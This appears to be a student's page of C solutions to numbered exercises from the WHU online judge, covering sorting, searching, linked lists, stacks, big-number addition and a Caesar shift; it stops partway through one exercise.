    <content type="text"><![CDATA[WHU OJ ，已无法访问 1021乒乓球比赛123456789101112131415161718192021222324252627282930313233343536373839#include&lt;stdio.h&gt;int main()&#123; char i,j,k; for(i='X'; i&lt;'X'+3; i++) &#123; for(j='X'; j&lt;'X'+3; j++) &#123; for(k='X'; k&lt;'X'+3; k++) &#123; if(j!=i&amp;&amp;k!=i&amp;&amp;k!=j) &#123; printf("%c %c\n%c %c\n%c %c\n",'A',i,'B',j,'C',k); &#125; &#125; &#125; &#125; for(i='X'; i&lt;'X'+3; i++) &#123; for(j='X'; j&lt;'X'+3; j++) &#123; for(k='X'; k&lt;'X'+3; k++) &#123; if(j!=i&amp;&amp;k!=i&amp;&amp;k!=j) &#123; if(i=='X'||k=='X'||k=='Z') &#123; continue; &#125; else &#123; printf("%c %c\n%c %c\n%c %c\n",'A',i,'B',j,'C',k); &#125; &#125; &#125; &#125; &#125; return 0;&#125; 1025计算时间123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int time_elapse(int hour, int minute, int second)&#123; return hour*3600+minute*60+second;&#125;int main()&#123; int n; char t[9],s[9]; int a,b,c,d,e,f; int s1,s2; scanf("%d",&amp;n); for(; n&gt;0; n--) &#123; while(getchar()!='\n'); scanf("%s%s",t,s); a=t[0]*10+t[1]-528; b=t[3]*10+t[4]-528; c=t[6]*10+t[7]-528; d=s[0]*10+s[1]-528; e=s[3]*10+s[4]-528; f=s[6]*10+s[7]-528; s1=time_elapse(a,b,c); s2=time_elapse(d,e,f); printf("%d %d %d\n",s1,s2,(s1&gt;s2?s1-s2:s2-s1)); &#125; return 0;&#125; 1026非递归斐波那契123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int fibonacci(int n)&#123; int a,b; a=b=1; while(n--&gt;1)&#123; b=b+a; a=b-a; &#125; return b;&#125;int main()&#123; int n,m; scanf("%d",&amp;n); for(; n&gt;0; n--) &#123; scanf("%d",&amp;m); printf("%d\n",fibonacci(m)); &#125; return 0;&#125;/*#include&lt;iostream&gt;using namespace std;int main()&#123; int n, i, f1, f2; cin&gt;&gt;n; f1 = 0; f2 = 1; while(n--&gt;1)&#123; f2 += f1; f1 = f2 - f1; &#125; cout&lt;&lt;(n==-1?0:f2)&lt;&lt;endl;&#125;*/ 1028递归转换进制12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//#define A 10#define B 7int change(int n)&#123; int temp; if(n&lt;B) &#123; printf("%d",n); return 0; &#125; else &#123; change(n/B); change(n%B); &#125;&#125;int main()&#123; int n,m; scanf("%d",&amp;n); for(; n&gt;0; n--) &#123; scanf("%d",&amp;m); change(m); printf("\n"); &#125; return 0;&#125; 1029求自然对数1234567891011121314#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int i; double fenMu=1; double ans=1; for(i=1;fenMu-1e15&lt;0;i++)&#123; fenMu*=i; ans+=1.0/fenMu; &#125; printf("%.14lf\n",ans); return 0;&#125; 1030二次方程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;math.h&gt;int fangcheng(int a,int b,int c)&#123; double x1,x2,dal; if(a!=0) &#123; if(b*b-4*a*c&gt;0) &#123; dal=pow(b*b-4*a*c,0.5); x1=(-b-dal)/(double)(2*a); x2=(-b+dal)/(double)(2*a); if(a&lt;0) &#123; dal=x1; x1=x2; x2=dal; &#125; printf("%.2lf %.2lf",x1,x2); return 0; &#125; else if(b*b-4*a*c==0) &#123; if(b==0) &#123; printf("0.00"); return 0; &#125; else &#123; printf("%.2lf",-(double)b/(2*a)); return 0; &#125; &#125; else &#123; printf("NULL"); return 0; &#125; &#125; else &#123; if(b==0) &#123; if(c==0) &#123; printf("NULL"); return 0; &#125; else &#123; printf("NULL"); return 0; &#125; &#125; else &#123; if(c==0) &#123; printf("0.00"); return 0; &#125; else &#123; printf("%.2lf",-c/(double)b); return 0; &#125; &#125; &#125;&#125;int main()&#123; int n,a,b,c,i; scanf("%d",&amp;n); for(i=1; i&lt;=n; i++) &#123; scanf("%d%d%d",&amp;a,&amp;b,&amp;c); printf("Case %d: ",i); fangcheng(a,b,c); printf("\n"); &#125; return 0;&#125; 1034十进制转二进制12345678910111213141516171819202122232425#include&lt;stdio.h&gt;int main()&#123; int n,i,j; long long a; int b[33]; scanf("%d",&amp;n); for(i=0; i&lt;n; i++) &#123; scanf("%lld",&amp;a); j=0; if(a==0)&#123;printf("%ld\n",a);continue;&#125; while(a!=0) &#123; b[j++]=a%2; a=a/2; &#125; while(--j&gt;=0)&#123; printf("%d",b[j]); &#125; printf("\n"); &#125; return 0;&#125; 1035十进制转其他12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;int main()&#123; int n,i,j,jidi; long long a; int b[33];// scanf("%d",&amp;n); n=60000; printf("本程序提供2**32以下十进制正整数转任意36以内进制结果\ \n输入(-1,-1)结束\n"); printf("请每次输入两个数，前者作为基底，后者待转换\n"); for(i=0; i&lt;n; i++) &#123; scanf("%d%lld",&amp;jidi,&amp;a);if(jidi==-1)&#123;break;&#125; j=0; if(a==0)&#123;printf("%lld\n",a);continue;&#125; while(a!=0) &#123; b[j++]=a%jidi; a=a/jidi; &#125; while(--j&gt;=0)&#123; if(b[j]&gt;9)&#123;printf("%c",'A'-10+b[j]);&#125; else &#123;printf("%d",b[j]);&#125; &#125; printf("\n"); &#125; return 0;&#125; 1036字符替换123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int substitute(char str[], char oldchar, char newchar)&#123; int time=0; int i=0; while(str[i]!='\0') &#123; if(str[i]==oldchar) &#123; str[i]=newchar; time++; &#125; i++; &#125; return time;&#125;int main()&#123; char str[1001]; char oldchar,newchar; while (scanf("%s %c %c", str, &amp;oldchar, &amp;newchar) == 3) /* 或!= EOF , 但前者更好 */ &#123; printf("%d ",substitute(str,oldchar,newchar)); puts(str); //处理 &#125; return 0;&#125; 1037关键词统计123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int i,j,k,n,times,flag; char str[10][11]; char long_str[10001]; scanf("%d",&amp;n); for(i=0;i&lt;n;i++)&#123; scanf("%s",str[i]); &#125; scanf("%s",long_str); for(i=0;i&lt;n;i++)&#123; times=0; for(j=0;j&lt;strlen(long_str)-strlen(str[i])+1;)&#123; if(long_str[j]==str[i][0])&#123; flag=0; for(k=0;k&lt;strlen(str[i]);k++)&#123; if(long_str[j+k]!=str[i][k])&#123; flag=1;break; &#125; &#125; if(flag==1)&#123;j++;&#125; else&#123; times++;j+=k; &#125; &#125; else&#123;j++;&#125; &#125; printf("%d\n",times); &#125; return 0;&#125; 1037学号查询12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;string.h&gt;struct student&#123; char name[32]; char birth[9]; char num[9]; char major[32];&#125;;int main()&#123; struct student stu[30]; int i,j,n; char num1[9]; for(i=0;i&lt;30;i++)&#123; scanf("%s %s %s %s",stu[i].name,stu[i].birth,stu[i].num,stu[i].major); &#125; scanf("%d",&amp;n); for(i=0;i&lt;n;i++)&#123; scanf("%s",num1); for(j=0;j&lt;30;j++)&#123; if(strcmp(stu[j].num,num1)==0)&#123; printf("%s %s %s %s\n",stu[j].name,stu[j].birth,stu[j].num,stu[j].major); break; &#125; &#125; if(j==30)&#123; printf("Not found\n"); &#125; &#125;&#125; 1038插入排序123456789101112131415161718192021222324252627282930313233343536373839#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int nCase,i,j,k,temp; int n; int s[1000]; scanf("%d",&amp;nCase); for(i=0; i&lt;nCase; i++) &#123; scanf("%d",&amp;n); for(j=0; j&lt;n; j++) &#123; scanf("%d",s+j); &#125; for(j=0; j&lt;n; j++) &#123; temp=s[j]; for(k=j-1; k&gt;=0; k--) &#123; if(s[k]&gt;temp) &#123; s[k+1]=s[k]; &#125; else &#123; break; &#125; &#125; s[k+1]=temp; &#125; for(j=0; j&lt;n; j++) &#123; printf("%d ",s[j]); &#125; printf("\n"); &#125;&#125; 1042折半查找123456789101112131415161718192021222324252627282930313233343536#include&lt;stdio.h&gt;int data[20000];int binary_search(int d[], int s, int e, int q)&#123; int mid; while(s&lt;=e) &#123; mid=(s+e)/2; if(d[mid]==q) &#123; return mid; &#125; else if(d[mid]&lt;q)&#123;s=mid+1;&#125; else&#123;e=mid-1;&#125; &#125; return -1;&#125;int main()&#123; int n,i,m,s,e,q; scanf("%d",&amp;n); for(i=0; i&lt;n; i++) &#123; scanf("%d",data+i); &#125; scanf("%d",&amp;m); for(i=0; i&lt;m; i++) &#123; scanf("%d %d %d",&amp;s,&amp;e,&amp;q); if(e&gt;n)&#123;e=n;&#125; if(s&gt;n-1||s&gt;e-1)&#123;printf("-1\n");continue;&#125; printf("%d\n",binary_search(data,s,e-1,q)); &#125; return 0;&#125; 1043矩阵加法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include&lt;stdio.h&gt;int main()&#123; int M,N,a[11][11],b[11][11]; int i,j,flag,num; while(scanf("%d",&amp;M)==1&amp;&amp;M!=0&amp;&amp;scanf("%d",&amp;N)==1) &#123; for(i=1; i&lt;=M; i++) &#123; for(j=1; j&lt;=N; j++) &#123; scanf("%d",&amp;a[i][j]); &#125; &#125; for(i=1; i&lt;=M; i++) &#123; for(j=1; j&lt;=N; j++) &#123; scanf("%d",&amp;b[i][j]); &#125; &#125; for(i=1; i&lt;=M; i++) &#123; for(j=1; j&lt;=N; j++) &#123; a[i][j]+=b[i][j]; &#125; &#125; num=0; for(i=1; i&lt;=M; i++) &#123; flag=1; for(j=1; j&lt;=N; j++) &#123; if(a[i][j]!=0) &#123; flag=0; break; &#125; &#125; if(flag==1) &#123; num++; &#125; &#125; for(i=1; i&lt;=N; i++) &#123; flag=1; for(j=1; j&lt;=M; j++) &#123; if(a[j][i]!=0) &#123; flag=0; break; &#125; &#125; if(flag==1) &#123; num++; &#125; &#125; printf("%d\n",num); &#125; return 0;&#125; 1044逗号加法12345678910111213141516171819202122232425262728293031323334353637#include&lt;stdio.h&gt;int main()&#123; char a[20],b[20]; long long A,B,temp; int i,j; while(scanf("%s %s",a,b)==2) &#123; A=B=0; for(i=0; a[i]!='\0'; i++); j=-1;temp=1; while(--i&gt;=0) &#123; if(a[i]-'0'&gt;-1&amp;&amp;a[i]-'0'&lt;10) &#123; j++;temp=10*temp; A+=(a[i]-'0')*temp/10; &#125; if(a[i]==',')continue; if(a[i]=='-')A=-A; &#125; for(i=0; b[i]!='\0'; i++); j=-1;temp=1; while(--i&gt;=0) &#123; if(b[i]-'0'&gt;-1&amp;&amp;b[i]-'0'&lt;10) &#123; j++;temp=10*temp; B+=(b[i]-'0')*temp/10; &#125; if(b[i]==',')continue; if(b[i]=='-')B=-B; &#125; printf("%lld\n",A+B); &#125; return 0;&#125; 1046统计字符123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123; char a[7],na[7],b[1001]; int i,j,k; while(fgets(a,7,stdin)&amp;&amp;a[0]!='#') &#123; for(i=0; a[i]!='\0'; i++); for(j=0; j&lt;7; j++) &#123; na[j]=0; &#125; fgets(b,1000,stdin); for(k=0; b[k]!='\0'; k++) &#123; for(j=0; j&lt;i; j++) &#123; if(b[k]==a[j]) &#123; na[j]++; &#125; &#125; &#125; for(j=0; j&lt;i-1; j++) &#123; printf("%c %d\n",a[j],na[j]); &#125; &#125; return 0;&#125; 1048ZOJ12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int z,o,j,i; z=o=j=0; char a[101]; while(fgets(a,101,stdin)&amp;&amp;a[0]!='E')&#123; for(i=0;a[i]!='\0';i++)&#123; if(a[i]=='Z')&#123;z++;continue;&#125; if(a[i]=='O')&#123;o++;continue;&#125; if(a[i]=='J')&#123;j++;continue;&#125; &#125; while(1)&#123; if(z&gt;0)&#123;printf("Z");z--;&#125; if(o&gt;0)&#123;printf("O");o--;&#125; if(j&gt;0)&#123;printf("J");j--;&#125; if(z==0&amp;&amp;o==0&amp;&amp;j==0)&#123;break;&#125; &#125; printf("\n");z=o=j=0; &#125; return 0;&#125; 1049不循环反转数组（递归）12345678910111213141516#include&lt;stdio.h&gt;int a[100];void reverse(i)&#123; if(i==1)&#123;scanf("%d",a+i);printf("%d ",a[i]);&#125; else &#123; scanf("%d",a+i);reverse(i-1);printf("%d ",a[i]); &#125;&#125;int main()&#123; int n,i; scanf("%d",&amp;n); reverse(n); return 0;&#125; 1050百鸡问题123456789101112131415#include&lt;stdio.h&gt;int main()&#123; int x,y,z,n,i,j,k; while(scanf("%d",&amp;n)==1&amp;&amp;n!=EOF)&#123; for(i=0;i&lt;n/5+1;i++)&#123; for(j=0;j&lt;(n-5*i)/3+1;j++)&#123; if(5*i+3*j+(100-i-j+2)/3&lt;n+1)&#123; printf("x=%d,y=%d,z=%d\n",i,j,100-i-j); &#125; &#125; &#125; &#125; return 0;&#125; 1051折半查找’小于’临界点12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdio.h&gt;int data[20000];int binary_search(int d[], int s, int e, int q)&#123; int s0=s,e0=e; int mid; if(d[s]&gt;q-1)&#123;return 0;&#125; if(d[e]&lt;q)&#123;return e0-s0+1;&#125; while(1)&#123; mid=(s+e)/2; if(d[mid]&lt;q)&#123; if(d[mid+1]&lt;q)&#123;s=mid+1;&#125; else&#123;return mid-s0+1;&#125; &#125; else if(d[mid]&gt;q)&#123;e=mid-1;&#125; else&#123;e--;&#125; &#125;&#125;int main()&#123; int n,i,m,s,e,q; scanf("%d",&amp;n); for(i=0; i&lt;n; i++) &#123; scanf("%d",data+i); &#125; scanf("%d",&amp;m); for(i=0; i&lt;m; i++) &#123; scanf("%d %d %d",&amp;s,&amp;e,&amp;q); if(s==n||s==e) &#123; printf("-1\n"); continue; &#125; printf("%d\n",binary_search(data,s,e-1,q)); &#125; return 0;&#125; 1052全排列1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 10//#define D printf("m=%d\tproduct=%d\tstart=%d\ti=%d\tj=%d\tk=%d\tt=%d\n",m,product,start,i,j,k,t);//#define M for(start=0;start&lt;len;start++)&#123;printf("%d ",index[start]);&#125;printf("\n");void mySort(char* s)&#123; int len=strlen(s); int i,j; char temp; for(i=0;i&lt;len;i++)&#123; for(j=i+1;j&lt;len;j++)&#123; if(s[i]&gt;s[j])&#123; temp=s[i];s[i]=s[j];s[j]=temp; &#125; &#125; &#125;&#125;int main()&#123; char str[N+1],res[N+1],index[N+1]; int m,i,j,k,t,product,len; int start; while(scanf("%s%d",str,&amp;m)==2)&#123; len=strlen(str); mySort(str); //puts(str); for(i=0;i&lt;len;i++)&#123;index[i]=i;&#125; for(i=product=1;i&lt;len+1;i++)&#123; product*=i; if(product&gt;m)&#123;break;&#125; &#125; for(j=0;j&lt;len-i;j++)&#123; res[j]=str[j]; index[j]=-1; &#125; //从后往前数第i个字母前的都是按全排列的第一个排列的顺序排列 // printf("m=%d\tproduct=%d\ti=%d\n",m,product,i); while(j&lt;len)&#123; product/=i; //D start=m/product; //D for(t=0;index[t]==-1&amp;&amp;t&lt;len;t++); //D for(k=t;start!=0;k++)&#123; if(index[k]!=-1)&#123;start--;&#125; else&#123;continue;&#125; &#125; while(index[k]==-1)&#123;k++;&#125; //printf("%d***%d***\n",k,index[k]); D res[j]=str[k]; index[k]=-1; m%=product; // D M i--;j++; // printf("########################\n"); &#125; res[j]='\0'; puts(res); &#125; return 0;&#125; 1053画菱形123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; int n,i,j; while(scanf("%d",&amp;n)==1)&#123; for(i=0 ;i&lt;n+1;i++)&#123; for(j=0;j&lt;2*n-2*i;j++)&#123;printf(" ");&#125; for(j=0;j&lt;4*i+1;j++)&#123;printf("*");&#125; printf("\n"); &#125; for(i=n-1 ;i&gt;-1;i--)&#123; for(j=0;j&lt;2*n-2*i;j++)&#123;printf(" ");&#125; for(j=0;j&lt;4*i+1;j++)&#123;printf("*");&#125; printf("\n"); &#125; &#125; return 0;&#125; 1054冒泡排序交换次数123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; int n,i,j,a[1000],temp,t; while(scanf("%d",&amp;n)==1&amp;&amp;n!=0)&#123; for(i=0 ;i&lt;n;i++)&#123; scanf("%d",a+i); &#125; for(i=0,t=0;i&lt;n;i++)&#123; for(j=i+1;j&lt;n;j++)&#123; if(a[j]&lt;a[i])&#123;temp=a[j];a[j]=a[i];a[i]=temp;t++;&#125; &#125; &#125; printf("%d\n",t); &#125; return 0;&#125; 1055凯撒密码+K12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; char a[100]; int i,j; long k; while(scanf("%s",a)==1)&#123; scanf("%ld",&amp;k); for(i=0;a[i]!='\0';i++)&#123; j=(k+i+1)%26; a[i]=(a[i]-'A'+26-j)%26+'A'; &#125; puts(a); &#125; return 0;&#125; 1056大数相加12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#define N 1000+2int main()&#123; int n,i,j,k,m,len1,len2,jinwei; char a[N],b[N],c[N]; scanf("%d",&amp;n); for(m=0;m&lt;n;m++)&#123; scanf("%s%s",a,b); //向右对齐，左边补零 for(j=0;a[j]!='\0';a[j]-='0',j++); for(len1=j+1;j&gt;-1;a[j+N-len1]=a[j],j--); for(j=N-1-len1;j&gt;-1;a[j]=0,j--); for(k=0;b[k]!='\0';b[k]-='0',k++); for(len2=k+1;k&gt;-1;b[k+N-len2]=b[k],k--); for(k=N-1-len2;k&gt;-1;b[k]=0,k--);//相加 jinwei=0; for(i=N-2;i&gt;-1;i--)&#123; c[i]=(a[i]+b[i]+jinwei)%10; jinwei=(a[i]+b[i]+jinwei)/10; &#125;//输出 for(i=0;c[i]==0&amp;&amp;i&lt;N-1;i++); if(i==N-1)&#123;printf("0\n");continue;&#125;//考虑输入为(0,0)的情况 for(;i&lt;N-1;i++)&#123;printf("%d",c[i]);&#125; printf("\n"); &#125; return 0;&#125; 1057二分法解方程浮点1234567891011121314151617181920212223242526272829303132#include&lt;stdio.h&gt;#include&lt;math.h&gt;#define func(x) 2*x*x*x-4*x*x+3*x-6int main()&#123; int i,flag; double y,x,hi,lo; while(scanf("%lf",&amp;y)==1) &#123; flag=0; hi=10000; lo=-10000; if(func(lo)-y&gt;0||func(hi)-y&lt;0) &#123; printf("NULL\n");continue; &#125; while(!(fabs(lo-hi)&lt;0.000001)) &#123; x=(hi+lo)/2.0; if(func(x)-y&gt;0) &#123; hi=x; &#125; else if(func(x)-y&lt;0) &#123; lo=x; &#125; &#125; printf("%.4lf\n",x); &#125; return 0;&#125; 1058小试指针1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123; int arr[10]=&#123;1,3,5,7,9,11,13,15,17,19&#125;; int *pt=arr; // int *a,*b,*c,*d; //a=b=c=d=arr; printf("%p\n%p\n%p\n%d\n",&amp;arr[0],&amp;pt,pt,*pt); printf("%d\n",*pt+3); printf("%d\n",pt[3]); printf("%p\n",&amp;*pt); printf("%p\n",*&amp;pt); //printf("%d\n",*pt[3]); printf("%d\n",*(pt+3)); printf("%d\n",*pt++); printf("%d\n",*(pt++)); printf("%d\n",(*pt)++); printf("%d\n",++(*pt)); return 0;&#125; 1060转置矩阵12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int m,n,i,j; int *p; while(scanf("%d%d",&amp;m,&amp;n)==2)&#123; p=(int*)malloc(sizeof(int)*m*n); for(i=0;i&lt;m;i++)&#123; for(j=0;j&lt;n;j++)&#123; scanf("%d",p+i*n+j); &#125; &#125; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;m;j++)&#123; printf("%d ",*(p+j*n+i)); &#125; printf("\n"); &#125; free(p); &#125;&#125; 1061成绩查询12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#include&lt;math.h&gt;#define N 10struct student&#123; int id; int score;&#125;;void findmax(struct student *stu, int *score, int *index)&#123; int i; *score=(*stu).score; *index=0; for(i=0; i&lt;N; i++) &#123; if(*score&lt;(*(stu+i)).score) &#123; *score=(*(stu+i)).score; *index=i; &#125; &#125;&#125;void findmin(struct student *stu, int *score, int *index)&#123; int i; *score=(*stu).score; *index=0; for(i=0; i&lt;N; i++) &#123; if(*score&gt;(*(stu+i)).score) &#123; *score=(*(stu+i)).score; *index=i; &#125; &#125;&#125;void findaver(struct student *stu, int *score, int *index)&#123; int sum,i; int delta,delta_min; for(i=sum=0; i&lt;N; i++) &#123; sum+=(*(stu+i)).score; &#125; *score=(*stu).score; *index=0; delta_min=fabs((*stu).score*N-sum); for(i=0; i&lt;N; i++) &#123; delta=fabs((*(stu+i)).score*N-sum); if(delta&lt;delta_min) &#123; delta_min=delta; *score=(*(stu+i)).score; *index=i; &#125; &#125;&#125;int main()&#123; struct student *stu=(struct student*)malloc(sizeof(struct student)*N); int i; int score,index; for(i=0; i&lt;N; i++) &#123; scanf("%d %d",&amp;((*(stu+i)).id),&amp;((*(stu+i)).score)); &#125; findmax(stu,&amp;score,&amp;index); printf("%d %d\n",(*(stu+index)).id,score); findmin(stu,&amp;score,&amp;index); printf("%d %d\n",(*(stu+index)).id,score); findaver(stu,&amp;score,&amp;index); printf("%d %d\n",(*(stu+index)).id,score); free(stu); return 0;&#125; 1063查找子字符串123456789101112131415161718192021222324252627282930313233343536#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;char *findstr(char *s, char *t)&#123; int i,j,flag; for(i=0; *(s+i)!='\0'; i++) &#123; if(*(s+i)==*t) &#123; flag=1; for(j=1; *(t+j)!='\0'; j++) &#123; if(*(s+i+j)!=*(t+j)) &#123; flag=0; break; &#125; &#125; if(flag==1) &#123; return s+i; &#125; &#125; &#125; return NULL;&#125;int main()&#123; char *s=(char*)malloc(sizeof(char)*1001); char *t=(char*)malloc(sizeof(char)*1001); while(scanf("%s%s",s,t)==2) &#123; printf("%p %p\n",s,findstr(s,t)); &#125; return 0;&#125; 1064队列操作123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//#define D printf("front=%d\trear=%d\n",front,rear);typedef int datatype;int main()&#123; int n,m,op,id,front,rear; while(scanf("%d%d",&amp;n,&amp;m)==2)&#123; n++; datatype* a=(datatype*)malloc(sizeof(datatype)*(n)); front=rear=0; while(m--)&#123; scanf("%d%d",&amp;op,&amp;id); if(1==op)&#123; if((rear+1)%n!=front)&#123; a[rear]=id; rear=(rear+1)%n; &#125; // D &#125; else if(2==op)&#123; if(rear!=front)&#123; front=(front+1)%n; &#125; // D &#125;else &#123;continue;&#125; &#125; if(front==rear)&#123;printf("NULL\n");continue;&#125; while(front!=rear)&#123; printf("%d ",a[front]); front=(front+1)%n; &#125;printf("\n"); &#125; return 0;&#125; 1065栈操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int *a;int top;int push(int vol,int id)&#123; if(top&gt;vol-2) &#123; return 1; &#125; else &#123; a[++top]=id; return 0; &#125;&#125;int pop(int vol)&#123; if(top==-1) &#123; return 1; &#125; else &#123; top--; return 0; &#125;&#125;//int debug()//&#123;// int i=top;// printf("top=%d\t",top);// while(i&gt;-1)&#123;// printf("%d ",a[i--]);// &#125;// printf("\n");// return 0;//&#125;int main()&#123; int n,m,op,id,i; while(scanf("%d%d",&amp;n,&amp;m)==2) &#123; a=(int*)malloc(sizeof(int)*n); top=-1; while(m--&gt;0) &#123; scanf("%d%d",&amp;op,&amp;id); if(op==1) &#123; push(n,id); //debug(); &#125; else if(op==2) &#123; pop(n); //debug(); &#125; else &#123; continue; &#125; &#125; if(top==-1)&#123;printf("NULL");&#125; while(top&gt;-1) &#123; printf("%d ",a[top--]); &#125; printf("\n"); free(a); &#125; return 0;&#125; 1066判断点是否在圆上12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct&#123; double x; double y;&#125;POINT;typedef struct&#123; double m; double n; double r;&#125;CIRCLE;int in_circle(POINT p, CIRCLE c)&#123; double temp1=(p.x-c.m)*(p.x-c.m)+(p.y-c.n)*(p.y-c.n); double temp2=c.r*c.r; if(temp1-temp2&gt;0)&#123;return 0;&#125; else if(temp1-temp2&lt;0)&#123;return 2;&#125; else &#123;return 1;&#125;&#125;int main()&#123; POINT p; CIRCLE c; while(scanf("%lf%lf%lf%lf%lf",&amp;p.x,&amp;p.y,&amp;c.m,&amp;c.n,&amp;c.r)==5) &#123; printf("%d\n",in_circle(p,c)); &#125; return 0;&#125; 1067字节输出1234567891011121314151617#include&lt;stdio.h&gt;union my_union&#123; int a; unsigned char b[sizeof(int)];&#125;;int main()&#123; int i; union my_union test; while(scanf("%d",&amp;test.a)==1)&#123; for(i=0;i&lt;sizeof(int);i++)&#123; printf("%.2X",test.b[i]); &#125;printf("\n"); &#125; return 0;&#125; 1068链表基本操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct NODE&#123; int val; struct NODE* next;&#125; node;node *head;int addNode(idx,val)&#123; node *p=head; node*q; int i=0; while(i!=idx&amp;&amp;p!=NULL) &#123; p=p-&gt;next; i++; &#125; if(p==NULL) &#123; return 0; &#125; q=(node*)malloc(sizeof(node)); q-&gt;val=val; if(p-&gt;next==NULL) &#123; p-&gt;next=q; q-&gt;next=NULL; &#125; else &#123; q-&gt;next=p-&gt;next; p-&gt;next=q; &#125; return 0;&#125;int editNode(idx,val)&#123; node* p=head; int i=0; while(i!=idx&amp;&amp;p!=NULL) &#123; p=p-&gt;next; i++; &#125; if(p==NULL) &#123; return 0; &#125; p-&gt;val=val; return 0;&#125;int delNode(idx)&#123; node* p=head; node*q; int i=0; while(i!=idx&amp;&amp;p!=NULL) &#123; q=p; p=p-&gt;next; i++; &#125; if(p==NULL) &#123; return 0; &#125; q-&gt;next=p-&gt;next; free(p); return 0;&#125;int appearNode(int idx)&#123; node* p=head; int i=0; while(i!=idx&amp;&amp;p!=NULL) &#123; p=p-&gt;next; i++; &#125; if(p==NULL) &#123; return 0; &#125; printf("%d\n",p-&gt;val); return 0;&#125;//int debug()//&#123;// node* p=head;// while(p!=NULL)&#123;// printf("%d-&gt;",p-&gt;val);p=p-&gt;next;// &#125;printf("\n");// return 0;//&#125;int main()&#123; int op,idx,val; head=(node*)malloc(sizeof(node)); head-&gt;next=NULL; head-&gt;val=111; while(scanf("%d%d%d",&amp;op,&amp;idx,&amp;val)==3) &#123; if(op!=1&amp;&amp;op!=2&amp;&amp;op!=3&amp;&amp;op!=4) &#123; continue; &#125; else if(op==1) &#123; addNode(idx,val); //debug(); &#125; else if(op==2) &#123; editNode(idx,val); //debug(); &#125; else if(op==3) &#123; delNode(idx); //debug(); &#125; else &#123; appearNode(idx); &#125; &#125; return 0;&#125; 1069浮点精确数12345678910111213141516#include&lt;stdio.h&gt;#include&lt;math.h&gt;int main()&#123; int p; double a,b,delta; while(scanf("%d%lf%lf",&amp;p,&amp;a,&amp;b)==3) &#123; delta=1.0; while(p--&gt;0)&#123;delta/=10;&#125; if(fabs(a-b)&lt;delta)&#123;printf("0\n");&#125; else if(a-b&lt;0)&#123;printf("-1\n");&#125; else&#123;printf("1\n");&#125; &#125; return 0;&#125; 1070三角形归类1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;#include&lt;math.h&gt;void my_sort(int *a,int *b,int *c)&#123; int temp; if(*a&gt;*b)&#123;temp=*a;*a=*b;*b=temp;&#125; if(*a&gt;*c)&#123;temp=*a;*a=*c;*c=temp;&#125; if(*b&gt;*c)&#123;temp=*b;*b=*c;*c=temp;&#125;&#125;int is_triangle(int a,int b,int c)&#123; if(a+b&gt;c)&#123;return 1;&#125; else&#123; printf("not a triangle");return 0; &#125;&#125;void choose_angle(int a,int b,int c)&#123; if(c*c-a*a-b*b&gt;0)&#123;printf("obtuse ");&#125; else if(c*c-a*a-b*b==0)&#123;printf("right ");&#125; else&#123;printf("acute ");&#125;&#125;void choose_edge(int a,int b,int c)&#123; if(a!=b&amp;&amp;b!=c)&#123;printf("scalene");return;&#125; if(a==b&amp;&amp;b==c)&#123;printf("equilateral");return;&#125; if(a==b||b==c)&#123;printf("isosceles");return;&#125;&#125;int main()&#123; int a,b,c; while(scanf("%d%d%d",&amp;a,&amp;b,&amp;c)==3)&#123; my_sort(&amp;a,&amp;b,&amp;c);//按非递减排序 if(is_triangle(a,b,c))&#123;//判断是否构成三角形 choose_angle(a,b,c);//按最大角类型分类 choose_edge(a,b,c);//按照边长类型分类 &#125; printf("\n"); &#125; return 0;&#125; 1071字符串串烧12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#define N 210void getnchar(char *str, int n)&#123; int i; for(i=0; i&lt;n-1;) &#123; str[i]=getchar(); if(str[i]=='\n') &#123; break; &#125; i++; &#125; str[i]='\0';&#125;int my_strlen(char *str)&#123; int len=0; while(str[len]!='\0') &#123; len++; &#125; return len;&#125;int my_strncat(char *dest, char *src, int n)&#123; int i=my_strlen(dest),j=my_strlen(src),k; for(k=0; k&lt;j&amp;&amp;k&lt;n; k++) &#123; 